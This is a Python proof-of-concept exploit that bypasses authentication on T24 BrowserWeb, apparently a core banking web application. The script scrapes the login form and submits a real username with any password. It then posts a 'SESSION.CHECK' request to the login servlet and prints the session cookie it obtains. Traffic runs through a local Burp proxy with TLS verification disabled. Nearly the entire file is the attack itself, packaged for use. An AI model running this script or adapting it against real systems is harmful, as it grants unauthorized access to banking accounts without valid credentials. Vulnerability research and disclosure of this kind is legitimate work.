"""
Author: manhnv
Website: manhnv.com
Email: nguyenmanh0397@gmail.com
"""

import requests
import warnings
import argparse

from bs4 import BeautifulSoup


warnings.filterwarnings('ignore')

# Setup Burpsuite proxy
proxies = {
    "http": "http://127.0.0.1:8080",
    "https": "http://127.0.0.1:8080"
}

session = requests.Session()

def get_form_login(url):
    print("\n\n----------> GET FROM LOGIN <----------------")
    url_login = "/BrowserWeb/servlet/BrowserServlet"
    arr_params = dict()

    req = session.get(url + url_login, proxies=proxies, verify=False, allow_redirects=False, timeout=3)
    soup = BeautifulSoup(req.text, 'html.parser')

    inputs = soup.find_all('input')

    for input in inputs:
        arr_params[input.get("name")] = input.get("value")
    print("=> DATA: {}".format(arr_params))
    return arr_params

def login(url, data):
    print("\n\n--------------> LOGIN <---------------------")
    url_login = "/BrowserWeb/servlet/BrowserLoginServlet"
    req = session.post(url + url_login, data=data, proxies=proxies, allow_redirects=False, verify=False)
    print("=> HEADERS: {}".format(req.headers))


def bypass_login(url):
    print("\n\n----------> BYPASS LOGIN <----------------")
    data = {
        "blankRequestType": "SESSION.CHECK"
    }
    url_login = "/BrowserWeb/servlet/BrowserLoginServlet"
    req = session.post(url + url_login, data=data, proxies=proxies, verify=False)

    if req.text.find("frameset") != -1 and req.text.find("frame"):
        print("=> BYPASSED LOGIN !!!")

        print("=> COOKIE: {}".format(session.cookies))

# ----------------- MAIN --------------------
def main():
    # python .\poc.py --url https://t24.manhnv.com --username manhnv
    parser = argparse.ArgumentParser(
        description="Exploit bypass authen T24 BrowserWeb",
        add_help=True
    )
    parser.add_argument('--url', type=str, required=True, help='Enter the url of t24 BrowserWeb')
    parser.add_argument('--username', type=str, required=True, help='Enter an account that exists on t24')

    args = parser.parse_args()

    username = args.username
    url = args.url

    data_params = get_form_login(url)
    data_params["signOnName"] = username
    data_params["password"] = "123456" # You can enter any password, the exact password is not required

    login(url, data_params)
    bypass_login(url)

    print("\n\nNext action: Go to burpsuite, Show response /BrowserWeb/servlet/BrowserLoginServlet in browser")


if __name__ == "__main__":
    main()